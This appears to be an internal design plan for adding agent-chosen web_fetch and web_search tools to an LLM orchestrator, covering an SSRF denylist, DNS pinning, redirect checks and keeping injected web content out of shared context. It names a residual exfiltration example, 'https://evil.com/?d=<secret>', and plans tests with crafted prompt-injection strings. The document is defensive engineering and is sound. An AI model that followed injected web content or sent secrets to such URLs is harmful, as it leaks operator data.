## 1. Context

P4.2-B3 (ADR-034) gave an agent subprocess reach — run the tests it is fixing, lint, read git history — but **everything it can touch is still on the local disk**. It cannot pull the doc a stack trace references, check whether an upstream bug is fixed, or look up an unfamiliar API. B4 adds the **network** tool surface: `web_fetch` (fetch an agent-chosen URL) and `web_search` (a query through a fixed provider) — the open-web half of the flagship investigation loop P4.1's turn-loop + B3's subprocess tools set up.

`web_fetch` is the project's **first tool where the URL is agent-chosen** (LLM-proposed, prompt-injection-influenceable) rather than operator-configured. Every prior network fetch in this codebase targets an **operator-authoritative** URL (`mcp/transport.py:110-128`, `plugins/fetch.py:233`, `llm/providers/openai_compatible.py:107`) with bounded-timeout/`verify=True` but **no SSRF guard** — there is none to reuse. So the load-bearing, genuinely-new work of B4 is **building the one app-level SSRF validator** that makes "let the agent reach the web, before the P4.3 egress sandbox exists" an *Accepted boundary* rather than an open door.

**The architect RATIFIED all five brief decision points** (dispatch 2026-06-05); I have **not** re-litigated them. This plan implements: ship **both** `web_fetch` + `web_search`, both rev-10 AUTO (D1); the **app-level SSRF validator floor now + the honest egress residual** (D2); the 4-sub-surface threat model with **web content as the most-untrusted output** rendered raw + the excerpt-filter extended to the web tools (D3); the **in-process httpx `LocalToolFn` + SSRF-validating resolve-then-pin transport**, with a per-turn **network** cap in the executor loop and `_execute_local_call` byte-frozen (D4/executor placement); ADR-035 + the ADR-028 D3 amendment (D5). ADR-035 is **drafted on this branch** (senior deliverable); the numbered tasks are the **junior impl**.

**The honest residual (carry-forward, inscribe — do not soften):** even with the floor, without the P4.3 egress firewall, **data-exfil to a *public* attacker URL** (`https://evil.com/?d=<secret>`) is **not** caught — the IP-range floor permits public hosts; the URL is agent-chosen. This is the **network half of `RB-FS/NET`** (ADR-031 D1a), now the **active-not-latent** surface (B3's network residual was latent — pytest/git don't intend to egress; B4's egress *is* the tool's function). Accepted **exactly as ADR-031 D1a / ADR-034 D2 modelled it**, on the **same one retirement path** (P4.3 wraps the egress; it does not re-do the app guard). The operator tightening knob is an **egress allowlist** (fetch only approved hosts); `web_fetch → COUNTDOWN` (the ratified-AUTO knob's conservative alternative) is the human-in-the-loop tightening — both named, neither built in B4.

**Verified load-bearing mechanism (read before implementing).** The output-as-untrusted reconcile reuses B3's exact two-channel argument: excluding a network `TOOL_RESULT` from `snapshot_excerpt` does **not** blind the acting agent, because the re-dispatch loop passes the **last** result-class event of a pass as the next pass's `current_event` (a channel distinct from the system-block excerpt). When the agent issues `web_fetch` as its focused/last call (the dominant flagship shape), its bytes survive as `current_event`; the exclusion only removes them from the cross-agent system-block steering surface. The same **batched-non-last** known-limitation as ADR-034 D3-iv carries over identically (a network result that is excerpt-excluded **and** not last → invisible next pass; raw-not-interpret removes the `OBSERVATION` carrier). Inscribed by reference, not re-discovered.

## 2. Tasks (atomic)

Per-tool param allowlists are **pinned** below. `web_fetch` routes **every** request — initial and every redirect hop — through the SSRF-validating resolve-then-pin transport; the URL that is connected to is always a **pinned, validated IP**, never a re-resolved host. `web_search` does **not** use the SSRF validator (its egress target is the single operator-configured provider endpoint).

### B4-1 — the SSRF validator + resolve-then-pin transport in `tools/net_trust.py`

- **What:** A new module holding the **one** network-trust primitive: (a) an IP-range **denylist classifier** over a resolved IP; (b) a **resolve-then-pin** custom `httpx` transport that resolves the host, validates **all** resolved IPs, connects to a **pinned** validated IP (no re-resolve), and re-runs the full check on **every redirect hop**; (c) a **credential-stripped anonymous** client builder. Build it **once, here**; consumed by `web_fetch` and any future agent-URL tool (carry-forward #4 — one network mechanism).
- **Where:** new `src/orchestrator/tools/net_trust.py`. Co-located with its only consumer (`network_tools.py`, B4-2), parallel to `mcp/subprocess_trust.py`; respects t1 (`tools/` is a downstream leaf — no upstream import). **Do NOT** put network code in `tools/local.py` (keep it in-process-pristine, mirroring B3's `subprocess_tools.py` separation).
- **Why:** ADR-035 D2/D3-i; brief carry-forward #4/#6; decision (2A) floor.
- **Pinned SSRF floor** (the non-negotiable denylist — classify the **resolved** IP via Python `ipaddress`, never the raw host string, so encoding tricks are normalised away):
  - **loopback** `127.0.0.0/8` + `::1` (`ip.is_loopback`)
  - **private** `10/8` · `172.16/12` · `192.168/16` + `fc00::/7` (`ip.is_private`)
  - **link-local** `169.254.0.0/16` + `fe80::/10` (`ip.is_link_local`) — **incl. cloud-metadata `169.254.169.254`** (subsumed; assert it explicitly in tests)
  - **unspecified** `0.0.0.0` + `::` (`ip.is_unspecified`)
  - **multicast / reserved** (`ip.is_multicast`, `ip.is_reserved`) — belt-and-suspenders
  - **IPv4-mapped IPv6** (`::ffff:127.0.0.1`): if `ip.version == 6 and ip.ipv4_mapped`, classify the **mapped v4** too (a known bypass class).
- **Acceptance:**
  - A pure classifier `is_denied_ip(ip: ipaddress.IPv4Address | IPv6Address) -> bool` (or `validate_resolved_ip(...) -> None` raising) implementing the floor above; **deny if ANY** resolved address is denied.
  - **Scheme allowlist (ratified knob):** `http` **and** `https` only; reject `file://`/`gopher://`/`ftp://`/`data://`/… **before** resolving. (The IP-range floor already blocks `http`-to-internal.)
  - **Resolve-then-pin (DNS-rebind / TOCTOU defense):** resolve the host **once** (e.g. `socket.getaddrinfo`), validate **all** returned IPs against the floor, select a validated IP, and **connect to that pinned IP** — do **not** re-resolve at connect time. For TLS, the original **hostname** is used for SNI / certificate verification (`verify=True`) while the **pinned IP** is the connection target. Implemented as a custom `httpx` transport/connection so the pin is enforced *inside* the client, not advisory.
  - **Redirect re-validation (ratified knob = re-validate each hop):** redirects are followed with a **bounded** `max_redirects` (pin **5**), and **every** redirect target re-runs the full scheme + resolve-then-pin check via the same transport (a `302 → http://169.254.169.254` is re-rejected). A denied hop → the fetch fails (→ `TOOL_FAILED`, distinct error class `ssrf_blocked`).
  - **Credential-stripped anonymous client (carry-forward #4 / decision 3-iv):** the client carries **no** `Authorization`, **no** cookies (cookie jar disabled), **no** orchestrator env / api-key / secret; a **cross-origin redirect must not forward** any auth (moot since none is sent — assert nothing is constructed). `verify=True` always (the ADR-032 precedent; constitution-enforced in B4-8).
  - **Bounded read + timeout (liveness):** expose the bounded-read contract used by B4-2 — the body is read **as it streams**, stopping at `MAX_RESULT_BYTES` (+1 to detect truncation), **never** buffering an unbounded response into the single writer (the ADR-028 D3 / B3 R0-A Y1 OOM lesson at network scale); a bounded `httpx.Timeout`.
  - **Tests (`tests/tools/`, no real network):** the floor — `127.0.0.1`, `::1`, `10.0.0.5`, `192.168.1.1`, `172.16.0.1`, `169.254.169.254`, `0.0.0.0`, `[::ffff:127.0.0.1]`, a sample `fc00::`/`fe80::` — **all denied**; a public IP (e.g. `93.184.216.34`) **allowed**; scheme `file://`/`ftp://` rejected; **DNS-rebind**: a stub resolver returning an internal IP → denied even when the hostname looks public; **redirect**: a stubbed `302 → 169.254.169.254` → `ssrf_blocked`; multi-A-record where **one** IP is internal → denied.
- **Out of scope:** an operator egress **allowlist** (the opt-in tightening — named in ADR-035, not built); a port allowlist (the IP floor covers internal ports; mention as an optional knob); HTTP method beyond GET.

### B4-2 — `web_fetch` closure + the network registry in `tools/network_tools.py`

- **What:** A new module building the `web_fetch` `LocalToolFn` closure: validate the param allowlist, build the **anonymous SSRF-validating** client from `net_trust` (B4-1), `GET` the URL through the resolve-then-pin transport, bounded-stream the body, and format into `LocalToolOutput`. Carries `_is_network_tool = True` (the per-turn-cap marker). Plus `build_network_tool_registry(...)`.
- **Where:** new `src/orchestrator/tools/network_tools.py` exporting `build_network_tool_registry(...) -> dict[str, LocalToolFn]` + a `_NetworkToolFn` marker class (`_is_network_tool: ClassVar[bool] = True`, mirroring `_SubprocessToolFn` at `subprocess_tools.py:50-64`). **Not** in `local.py`.
- **Why:** ADR-035 D1/D3/D4; brief decision (1b)/(4)/(5).
- **Pinned param allowlist:** `web_fetch` — `url` (**required**, str). Any other key → `LocalToolError` (no `headers`/`method`/`auth`/`body` passthrough — GET only, anonymous). The scheme + SSRF checks run inside `net_trust`.
- **Pinned liveness constants** (in `network_tools.py`; tunable per ADR-035 Reversibility): `WEB_FETCH_TIMEOUT_S = 20.0`; response cap = `MAX_RESULT_BYTES` (64 KiB, reused).
- **Acceptance:**
  - Any param key not in `{"url"}` → `LocalToolError` (→ `TOOL_FAILED`).
  - The URL flows **only** through the `net_trust` client; the closure has **no** path to a plain `httpx.get` / a non-validating client (enforced by B4-8).
  - **Result semantics (ride `_execute_local_call` unchanged):** a successful fetch at **any** HTTP status → `LocalToolOutput` (content includes the final status + bounded body, decoded `utf-8 errors="replace"`) → `TOOL_RESULT`. A `404`/`500` is **expected output, not** `TOOL_FAILED`. SSRF-blocked / scheme-rejected / DNS-failure / timeout / over-`max_redirects` → raise `LocalToolError` with a **distinct error class encoded in the message** (`ssrf_blocked:` / `scheme_rejected:` / `network_timeout:` / `fetch_failed:`) so the agent distinguishes "blocked" from "site returned an error" — the structured `error_class` stays the shared default because `_execute_local_call` is **byte-frozen** (mirrors ADR-034 D5 / `subprocess_tools.py:96-103`).
  - Body bounded at `MAX_RESULT_BYTES` **as it streams**; `output_truncated_at` set on truncation.
  - `_is_network_tool = True` readable via `getattr` (the marker class).
  - **Tests (`tests/tools/`, mocked transport — no real network):** happy path (mocked 200 → bounded body in `TOOL_RESULT`); disallowed param rejected; internal-URL → `ssrf_blocked` `TOOL_FAILED`; `file://` → `scheme_rejected`; over-size response → truncated + `output_truncated_at`; redirect-to-internal → `ssrf_blocked`; non-200 status → `TOOL_RESULT` (not failure).
- **Out of scope:** `web_search` (B4-3); POST/headers/auth; an HTML→text extractor (return bounded raw bytes — the agent acts on precise content, matching the raw-not-interpret stance).

### B4-3 — `web_search` closure + provider config (BLOCKED on §5-1 provider routing)

- **What:** Add the `web_search` `LocalToolFn` to `network_tools.py`: validate the param allowlist, read the operator-configured provider endpoint + API key (from env), issue the query to the **fixed** provider endpoint, and format results into `LocalToolOutput`. Carries `_is_network_tool = True`. **No SSRF validator** (the endpoint is operator-configured, not agent-chosen) — but bounded timeout + bounded output + the per-turn network cap still apply.
- **Where:** `src/orchestrator/tools/network_tools.py` (+ provider config plumbed from B4-4). Provider config: a new `config/web_search.yaml(.example)` — `provider` (id), fixed `base_url` (endpoint), `api_key_env` (env-var **name**; the **key value** is read from `os.environ` at call/build time, **never** committed — only `.example` is checked in — and **never** placed onto any fetched URL). Follows the existing `api_key_env` pattern (`llm/types.py:248`, `openai_compatible.py:101-102`).
- **Why:** ADR-035 D1/D3-iv; brief decision (1b) + the web_search-specific provider/key directive.
- **Pinned param allowlist:** `web_search` — `query` (**required**, str), `max_results` (optional int, clamp `[1, 20]`, default 10). Any other key → `LocalToolError`.
- **Pinned liveness constant:** `WEB_SEARCH_TIMEOUT_S = 15.0`; result text bounded at `MAX_RESULT_BYTES`.
- **Acceptance:**
  - **Provider is `§5-1`-routed** — the concrete endpoint + request/response shape is filled from the architect's provider choice (this task is **blocked** until routed; the config mechanism + fail-closed path are pinned regardless).
  - **Fail-closed when unconfigured:** no provider config / missing `api_key_env` value in `os.environ` → `LocalToolError("web_search not configured")` → `TOOL_FAILED` (no silent empty result). The provider key is sent **only** to the fixed provider endpoint, in the provider's auth header — **never** onto a URL, never logged.
  - Disallowed param → `LocalToolError`; `max_results` clamp enforced; results formatted into bounded `TOOL_RESULT` (title + URL + snippet per hit). Provider/network failure → `TOOL_FAILED` (distinct error class encoded in message: `search_provider_error:` / `network_timeout:`).
  - `_is_network_tool = True`.
  - **Tests (`tests/tools/`, mocked provider client):** happy path (mocked provider JSON → formatted hits); unconfigured → `not configured` `TOOL_FAILED`; disallowed param; `max_results` clamp; provider 5xx → `search_provider_error`; assert the api-key reaches **only** the provider endpoint (and is absent from any other request / from the output).
- **Out of scope:** the SSRF validator (N/A — fixed endpoint); multiple providers / provider fallback (one routed provider for the MVP; additive later); paging beyond `max_results`.

### B4-5 — add the per-turn **network** cap to the executor loop

- **What:** Add `MAX_NETWORK_CALLS_PER_TURN` + a counted **network** branch in the `execute_pending_tool_calls` loop, keyed on the `_is_network_tool` marker — mirroring the B3 subprocess cap branch (`executor.py:161-207`). **Separate** from the subprocess cap (see §5-2: network connections and subprocess forks are distinct resource classes; conflating them blurs each bound and would alter B3's semantics).
- **Where:** `src/orchestrator/tools/executor.py` — add the constant near `MAX_SUBPROCESS_CALLS_PER_TURN` (`:51`); add `network_calls_this_turn` beside `subprocess_calls_this_turn` (`:115`); add an `elif _is_network:` branch beside the `if _is_posture_b:` branch (`:170-197`) with `error_class="turn_network_cap_exceeded"`.
- **Why:** ADR-035 D4 / executor placement; brief decision (5) (the "or generalize" alternative is rejected in §5-2).
- **Pinned value:** `MAX_NETWORK_CALLS_PER_TURN = 10` (mirrors the subprocess cap; resets **per pass** → true per-turn bound `× (1+N)`, the ADR-033 D4 turn-loop multiplier — inscribe in ADR-035 D4 prose, matching ADR-034 D5).
- **Acceptance:** network `LocalToolFn` calls beyond the cap **per pass** → `TOOL_FAILED(turn_network_cap_exceeded)`; the **subprocess** cap branch is **byte-unchanged** (B3 behaviour preserved); `_execute_local_call` is **byte-frozen** (empty-decision-diff; t3b still passes — the cap is mechanism in the loop, not a decision). Test: `MAX_NETWORK_CALLS_PER_TURN + 1` web tool calls in one pass → the last → `turn_network_cap_exceeded`; subprocess + network caps are independent (10 subprocess + 10 network in one pass both allowed). **Before adding, grep `"turn_network_cap_exceeded"` repo-wide** to confirm no pre-existing consumer (expected: zero).
- **Out of scope:** generalising the subprocess cap into a shared "external call" counter (rejected, §5-2); changing `MAX_SUBPROCESS_CALLS_PER_TURN` or `MAX_MCP_CALLS_PER_TURN`.

### B4-6 — extend the `snapshot_excerpt` exclusion to the web tools

- **What:** Widen the excerpt-exclusion filter so `web_fetch`/`web_search` `TOOL_RESULT`s (like `mcp__` and subprocess results) are excluded from `snapshot_excerpt`, keyed on the `TOOL_CALL`'s `tool_name`. Web content is the **most** untrusted output (attacker-authorable by definition) — rendered **raw** `TOOL_RESULT`, **not** interpreted → `OBSERVATION` (no new `LLMPurpose`; the precise bytes are the value).
- **Where:** `src/orchestrator/agents/selection.py:91-129` — define `_NETWORK_TOOL_NAMES: frozenset[str] = {"web_fetch", "web_search"}` beside `_SUBPROCESS_TOOL_NAMES` (`:95`); extend `_external_output_tool_result_call_ids` to also match `tool_name in _NETWORK_TOOL_NAMES` (`:127`). Defined in the consumer (not imported from `tools/` — t1). Update the `_render_snapshot_excerpt` + `_external_output_tool_result_call_ids` docstrings (`:106-145`) to name the third **network** trust-class origin.
- **Why:** ADR-035 D3-iii; the ADR-034 D3-iv / ADR-011 / P4.1-Y1 reconcile, widened to network.
- **Acceptance:**
  - A `web_fetch` `TOOL_RESULT` is **absent** from the rendered excerpt; an in-process local `TOOL_RESULT` (e.g. `read_file`) is **still present** (trusted).
  - **Drift guard (constitution sync-test, `tests/tools/test_constitution.py`):** assert `set(build_network_tool_registry(<…>).keys()) == selection._NETWORK_TOOL_NAMES` — a future network tool added to the registry without updating the exclusion set **fails the build** (mirrors the B3-5 `_SUBPROCESS_TOOL_NAMES` sync-test).
  - Behavioural test: a crafted-injection string in a `web_fetch` `TOOL_RESULT` does **not** appear in a re-dispatched agent's `snapshot_excerpt` (system block), but the same bytes **do** reach the acting agent as `current_event` (the two-channel split — the same property B3 proved; cite the same-pass coupling watch-point comment).
- **Out of scope:** folding `_SUBPROCESS_TOOL_NAMES` + `_NETWORK_TOOL_NAMES` into one set (rejected, §5-3 — keep the three origins legible + the drift sync-tests separable); a `ToolResultMeta.external_output` flag (rejected — would touch the byte-frozen `_execute_local_call`); interpreting web output.

## 3. Execution order

Single-junior serial (project norm — no junior parallelism). Dependency graph:

```
B4-1 (net_trust) ──▶ B4-2 (web_fetch) ──▶ B4-4 (wire) ──▶ B4-8 (constitution t10)
                          ▲                    ▲
B4-3 (web_search) ────────┘ (same module;      │  (wires both tools)
   [BLOCKED on §5-1]         lands after B4-2)  │
B4-5 (network cap) ── independent ─────────────┤  (touches executor.py only)
B4-6 (excerpt filter) ── independent ──────────┤  (selection.py; sync-test needs B4-2's registry)
B4-7 (ADR-028/031 amend) ── independent doc ───┘
```

- **B4-1 → B4-2 → B4-4** are strictly sequential (validator → web_fetch → wiring). **B4-3** (web_search) shares `network_tools.py` with B4-2, lands after it, and is **blocked on the architect routing the provider (§5-1)** — the web_fetch chain is **unblocked** and can proceed first.
- **B4-5, B4-7** can land any time (no shared files with the chain). **B4-6**'s sync-test depends on `build_network_tool_registry` existing (B4-2/B4-3).
- **B4-8** last (guards the landed surface). **One atomic = one commit, named after its atomic** (RC-17): `P4.2-B4-1: …` … `P4.2-B4-8: …`. `web_fetch` (B4-2) and `web_search` (B4-3) are distinct trust surfaces → distinct commits even though they share the module.
